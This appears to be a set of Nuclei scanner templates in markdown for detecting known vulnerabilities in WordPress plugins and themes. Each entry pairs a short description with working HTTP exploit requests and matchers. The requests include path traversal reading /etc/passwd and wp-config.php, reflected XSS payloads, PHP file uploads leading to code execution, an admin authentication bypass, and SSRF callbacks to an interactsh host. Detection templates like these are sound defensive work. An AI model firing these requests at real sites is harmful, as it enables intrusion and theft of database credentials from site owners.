# Under Construction, Coming Soon & Maintenance Mode \< 1.1.2 - Server Side Request Forgery (SSRF)

## Description

- The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).

- severity - high
- tags - ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/2
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# WordPress ProStore \<1.1.3 - Open Redirect

## Description

- WordPress ProStore theme before 1.1.3 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wordpress,wp-theme,redirect,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/prostore/go.php?https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Themes - Code Injection

## Description

- Fifteen WordPress themes are susceptible to code injection using a version of epsilon-framework, due to lack of capability and CSRF nonce checks in AJAX actions.
- severity - high
- tags - wordpress,rce,ssrf,edb,wpscan

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=action_name HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://interact.sh

```

### Matchers

**Type - word**

- part - body
- words
  1. Interactsh Server
  2. protocol_version

**Type - status**

- status
  1. 200

---

# WordPress WPify Woo Czech \<3.5.7 - Cross-Site Scripting

## Description

- WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $\_SERVER['PHP_SELF'] in an attribute without being escaped first. The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.
- severity - high
- tags - wp,wordpress,xss,wp-plugin,wpify,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/">\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. ">\<script>alert(document.domain)\</script>
  2. Add a new VAT ID to the queue
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting

## Description

- WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.

- severity - medium
- tags - xss,,wp,wpscan,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&

### Matchers

**Type - word**

- part - body
- words
  1. value="FB_appId">\<script>alert(document.domain)\</script>"

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# WordPress eCommerce Music Store \<=1.0.14 - Open Redirect

## Description

- WordPress eCommerce Music Store plugin through 1.0.14 contains an open redirect vulnerability via the referer header. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - musicstore,wp,wpscan,seclists,wordpress,redirect,wp-plugin

## Requests

### Step - 1

```
GET /wp-content/plugins/music-store/ms-core/ms-submit.php HTTP/1.1
Host: {{Hostname}}
Referer: https://interact.sh

```

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Ambience Theme \<=1.0 - Cross-Site Scripting

## Description

- WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.

- severity - medium
- tags - wp-plugin,wp,edb,wpscan,wordpress,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg

### Matchers

**Type - word**

- part - body
- words
  1. \<body onload=alert(1)>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Woody Code Snippets \<2.4.6 - Cross-Site Scripting

## Description

- WordPress Woody Code Snippets plugin before 2.4.6 contains a cross-site scripting vulnerability. It does not escape generated URLs before outputting them back in an attribute.
- severity - high
- tags - xss,wp,wordpress,authenticated,woody,wpscan,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. import-wbcr_insert_php&a\">\<script>alert(1)\</script>"
  2. Woody Code Snippets Import
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Email Verification for WooCommerce \< 1.8.2 - Loose Comparison to Authentication Bypass

## Description

- Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2 contains a loose comparison issue which could allow any user to log in as administrator.

- severity - critical
- tags - woocommerce,wp,wpscan,wordpress,wp-plugin

## Requests

- Method - GET

### URL

- {{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
- {{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=

### Matchers

**Type - regex**

- part - header
- regex
  1. wordpress*logged_in*[a-z0-9]{32}

**Type - word**

- part - body
- words
  1. Your account has been activated!
  2. From your account dashboard you can view your
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Clearfy Cache \<2.0.5 - Cross-Site Scripting

## Description

- WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. ">\<script>alert(1)\</script>
  2. Webcraftic Clearfy - WordPress optimization plugin
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Flow-Flow Social Stream \<=3.0.71 - Cross-Site Scripting

## Description

- WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.
- severity - medium
- tags - xss,wordpress,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E

### Matchers

**Type - word**

- part - body
- words
  1. "hash":"\<img src=x onerror=alert(document.domain)>"
  2. "errors"
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Checkout Fields Manager for WooCommerce \<5.5.7 - Cross-Site Scripting

## Description

- WordPress Checkout Fields Manager for WooCommerce 5.5.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,authenticated,woocommerce,wpscan,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. > -->\<script>alert(1)\</script>&action=wooccm_nuke_options&

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Health Check & Troubleshooting \<1.24 - Local File Inclusion

## Description

- WordPress Health Check & Troubleshooting prior to 1.2.4 is vulnerable to local file inclusion. Exploitation does require authentication.
- severity - high
- tags - lfi,wp,wordpress,wp-plugin,authenticated,lfr,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

action=health-check-view-file-diff&file=../../../../../../etc/passwd

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# WordPress 3DPrint Lite \<1.9.1.5 - Arbitrary File Upload

## Description

- WordPress 3DPrint Lite plugin before 1.9.1.5 contains an arbitrary file upload vulnerability. The p3dlite_handle_upload AJAX action of the plugin does not have any authorization and does not check the uploaded file. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - high
- tags - wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------54331109111293931601238262353

-----------------------------54331109111293931601238262353
Content-Disposition: form-data; name="action"

p3dlite_handle_upload
-----------------------------54331109111293931601238262353
Content-Disposition: form-data; name="file"; filename={{randstr}}.php
Content-Type: text/php

<?php echo '3DPrint-arbitrary-file-upload'; ?>
-----------------------------54331109111293931601238262353--

```

### Step - 2

```
GET /wp-content/uploads/p3d/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(all_headers_2, "text/html")
  2. status_code_2 == 200
  3. contains(body_2, '3DPrint-arbitrary-file-upload')
- condition - and

---

# WordPress ShortPixel Image Optimizer \<4.22.10 - Cross-Site Scripting

## Description

- WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.
- severity - medium
- tags - shortpixel,authenticated,wpscan,xss,wp-plugin,wp,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. &\">\<script>alert(1)\</script>&noheader=true&sp-action

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Memphis Document Library 3.1.5 - Local File Inclusion

## Description

- WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion.
- severity - high
- tags - wpscan,wordpress,wp-plugin,lfi,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/mdocs-posts/?mdocs-img-preview=../../../wp-config.php
- {{BaseURL}}/?mdocs-img-preview=../../../wp-config.php

### Matchers

**Type - word**

- words
  1. DB_NAME
  2. DB_PASSWORD
- part - body
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Brandfolder - Open Redirect (RFI & LFI)

## Description

- WordPress Brandfolder is vulnerable to remote/local file inclusion and allows remote attackers to inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath' parameter which will redirect the victim to it.

- severity - medium
- tags - wp,brandfolder,edb,wpscan,wp-plugin,redirect,rfi,wordpress,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress WooCommerce Google Shopping \< 1.2.4 - Cross-Site Scripting

## Description

- WordPress WooCommerce Google Shopping \< 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and executing it in a logged in admin context.
- severity - high
- tags - wp-plugin,xss,authenticated,woocommerce,wpscan,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Members List \<4.3.7 - Cross-Site Scripting

## Description

- WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.
- severity - medium
- tags - wp,wordpress,wp-plugin,xss,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x

### Matchers

**Type - word**

- part - body
- words
  1. ">\<img src onerror=alert(document.domain) x
  2. wrap tern-wrap
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress NativeChurch Theme - Local File Inclusion

## Description

- WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file.

- severity - high
- tags - wp-theme,lfi,wp,packetstorm,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
  3. DB_HOST
  4. The base configurations of the WordPress
- condition - and

---

# WordPress Newsletter Manager \< 1.5 - Unauthenticated Open Redirect

## Description

- WordPress Newsletter Manager \< 1.5 is susceptible to an open redirect vulnerability. The plugin used base64 encoded user input in the appurl parameter without validation to redirect users using the header() PHP function, leading to an open redirect issue.
- severity - medium
- tags - redirect,wp-plugin,newsletter,wp,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?wp_nlm=confirmation&appurl=aHR0cDovL2ludGVyYWN0LnNo

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress SimpleFilelist - Remote Code Execution

## Description

- Simple File List WordPress plugin was found to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. The Python exploit first uploads a file containing PHP code but with a png image file extension. A second request is sent to move (rename) the png file to a PHP file.

- severity - critical
- tags - wpscan,wordpress,wp-plugin,rce,intrusive,fileupload,python

## Requests

### Step - 1

```
POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2

--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_ID"

1
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_FileUploadDir"

/wp-content/uploads/simple-file-list/
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Timestamp"

1587258885
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="eeSFL_Token"

ba288252629a5399759b6fde1e205bc2
--6985fa39c0698d07f6d418b37388e1b2
Content-Disposition: form-data; name="file"; filename="nuclei.png"
Content-Type: image/png

<?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)"; phpinfo(); ?>
--6985fa39c0698d07f6d418b37388e1b2--

```

### Step - 2

```
POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Accept: */*
Content-Type: application/x-www-form-urlencoded

eeSFL_ID=1&eeFileOld=nuclei.png&eeListFolder=%2F&eeFileAction=Rename%7Cnuclei.php

```

### Step - 3

```
GET /wp-content/uploads/simple-file-list/nuclei.php HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - word**

- words
  1. Nuclei - Open source project (github.com/projectdiscovery/nuclei)
  2. PHP Version
  3. Configuration Command
- part - body
- condition - and

**Type - word**

- words
  1. text/html
- part - header

**Type - status**

- status
  1. 200

---

# WordPress Age Gate \<2.13.5 - Open Redirect

## Description

- WordPress Age Gate plugin before 2.13.5 contains an open redirect vulnerability via the \_wp_http_referer parameter after certain actions and after invalid or missing nonces. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - agegate,unauth,wpscan,packetstorm,wp-plugin,redirect,wordpress,wp

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-admin/admin-post.php
  - age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&\_wp_http_referer=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress All-in-One Security \<=4.4.1 - Open Redirect

## Description

- WordPress All-in-One Security plugin through 4.4.1 contains an open redirect vulnerability which can expose the actual URL of the hidden login page feature. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

- severity - low
- tags - wp-plugin,redirect,wordpress,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/?aiowpsec_do_log_out=1&after_logout=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Ultimate Member \<2.1.7 - Open Redirect

## Description

- WordPress Ultimate Member plugin before 2.1.7 contains an open redirect vulnerability on the registration and login pages via the "redirect_to" GET parameter. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - wp-plugin,redirect,wordpress,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/register/?redirect_to=https://interact.sh/

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress Grimag \<1.1.1 - Open Redirection

## Description

- WordPress Grimag theme before 1.1.1 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - low
- tags - wp-theme,redirect,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/Grimag/go.php?https://interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$
- part - header

---

# WordPress My Chatbot \<= 1.1 - Cross-Site Scripting

## Description

- WordPress My Chatbot \<= 1.1 is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.
- severity - high
- tags - wordpress,wp-plugin,xss,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution

## Description

- The AIT CSV Import/Export plugin \<= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.

- severity - critical
- tags - wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive

## Requests

### Step - 1

```
POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
Host: {{Hostname}}
Accept: */*
Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8

--------------------------ab360007dbae2de8
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
Content-Type: application/octet-stream

sep=;<?php echo md5('ait-csv-import-export-rce');?>

--------------------------ab360007dbae2de8--

```

### Step - 2

```
GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. fe394b60dc324c3bac3060d600ad4349

**Type - status**

- status
  1. 200

---

# WordPress 404 to 301 Log Manager \<3.1.2 - Cross-Site Scripting

## Description

- WordPress 404 to 301 Log Manager 3.1.2 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wpscan,wp-plugin,xss,wp,wordpress,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. ">\<script>alert(1)\</script>
  2. 404 Error Logs
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress All Export \<1.3.6 - Cross-Site Scripting

## Description

- WordPress All Export plugin before version 1.3.6 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wp-plugin,xss,wp,wordpress,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. manage&a\">\<script>alert(1)\</script>">
  2. Manage Exports
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Javo Spot Premium Theme - Local File Inclusion

## Description

- WordPress Javo Spot Premium Theme is vulnerable to local file inclusion that allows remote unauthenticated attackers access to locally stored file and return their content.
- severity - high
- tags - wordpress,wp-theme,lfi,wp,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Pie Register \< 3.7.2.4 - Open Redirect

## Description

- WordPress Pie Register \< 3.7.2.4 is susceptible to an open redirect vulnerability because the plugin passes unvalidated user input to the wp_redirect() function.
- severity - low
- tags - redirect,wp-plugin,pieregister,wpscan,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/?piereg_logout_url=true&redirect_to=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh._$

---

# WordPress SEO Redirection \<7.4 - Cross-Site Scripting

## Description

- WordPress SEO Redirection 7.4 does not escape the tab parameter before outputting it back in JavaScript code, leading to a reflected cross-site scripting vulnerability.

- severity - medium
- tags - wordpress,xss,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/options-general.php?page=seo-redirection.php&tab=cutom HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

tab=%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%3E

```

### Step - 3

```
GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<svg/onload=alert(/XSS/)>
  2. settings_page_seo-redirection
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Adaptive Images \< 0.6.69 - Cross-Site Scripting

## Description

- WordPress Adaptive Images \< 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.
- severity - high
- tags - wpscan,wordpress,xss,wp-plugin,wp

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true

### Matchers

**Type - word**

- words
  1. \<img/src/onerror=alert(document.domain)>
  2. \<td>Image\</td>
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Age Gate \<2.20.4 - Cross-Site Scripting

## Description

- WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.

- severity - high
- tags - xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. ">\<script>alert(document.domain)\</script>
  2. Age Gate Restriction Settings
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress ChurcHope Theme \<= 2.1 - Local File Inclusion

## Description

- WordPress ChurcHope Theme \<= 2.1 is susceptible to local file inclusion. The vulnerability is caused by improper filtration of user-supplied input passed via the 'file' HTTP GET parameter to the '/lib/downloadlink.php' script, which is publicly accessible.
- severity - high
- tags - wp,wpscan,wordpress,wp-theme,lfi

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Analytify \<4.2.1 - Cross-Site Scripting

## Description

- WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.

- severity - medium
- tags - wp,wordpress,analytify,wpscan,wp-plugin,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/aa404bb?a\</script>\<script>alert(/XSS/)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. text/javascript">alert(/XSS/)\</script>
  2. wp-analytify
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 404

---

# WordPress Advanced Access Manager \< 5.9.9 - Local File Inclusion

## Description

- WordPress Advanced Access Manager versions before 5.9.9 are vulnerable to local file inclusion and allows attackers to download the wp-config.php file and get access to the database, which is publicly reachable on many servers.

- severity - high
- tags - wordpress,wp-plugin,lfi,wp,accessmanager,wpscan

## Requests

- Method - GET

### URL

